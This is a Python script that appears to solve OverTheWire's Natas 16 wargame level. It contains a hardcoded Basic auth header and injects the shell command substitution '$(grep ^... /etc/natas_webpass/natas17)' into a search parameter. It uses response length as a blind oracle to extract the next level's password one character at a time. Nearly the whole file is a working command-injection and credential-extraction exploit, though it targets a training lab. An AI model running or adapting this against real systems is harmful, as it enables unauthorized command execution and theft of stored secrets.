import requests
import string

def checkPassword(password):
    print(f'Checking {password}')
    r = requests.get('http://natas16.natas.labs.overthewire.org', 
        headers = {
            'Authorization': 'Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=='
        },
        params = {
            'needle': f'$(grep ^{password} /etc/natas_webpass/natas17)',
            'submit': 'Search'
        }
    )
    content = r.content.decode()
    return len(content) < 461926 # true if response doesn't show all the content in dictionary.txt

knowPassword = ''
while True:
    flag = False
    for ch in string.ascii_letters + string.digits:
        if checkPassword(knowPassword + ch):
            knowPassword += ch
            flag = True
            break
    if not flag:
        print(f'Complete: {knowPassword}')
        break